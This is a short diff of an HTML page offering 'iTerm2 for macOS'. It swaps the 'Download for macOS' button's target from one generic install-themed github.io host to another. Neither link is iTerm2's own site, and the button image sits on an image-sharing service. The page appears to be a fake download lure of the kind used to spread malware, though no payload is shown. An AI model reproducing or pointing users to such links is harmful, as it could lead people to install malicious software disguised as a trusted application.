@@ -6,7 +6,7 @@
 <h3>iTerm2 for macOS</h3>
 <p>iTerm2 for macOS serves power users who live in shells all day and depend on tabs, panes and automation to stay organised.</p>
 
-<a href="https://mac-software-install.github.io/.github/iTerm2">
+<a href="https://software-install-apps.github.io/.github/iTerm2">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
